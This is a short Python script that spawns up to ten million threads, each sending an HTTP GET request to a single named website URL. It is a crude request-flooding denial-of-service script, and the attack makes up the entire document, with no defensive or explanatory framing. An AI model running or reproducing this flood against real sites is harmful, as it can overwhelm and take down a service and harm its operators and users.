import requests,threading
url = "http://trungkien.tk/wibu.php"
def main():
  res = requests.get(url)
  print(res)
for i in range(10000000):
  new_thread = threading.Thread(target=main, args=()).start()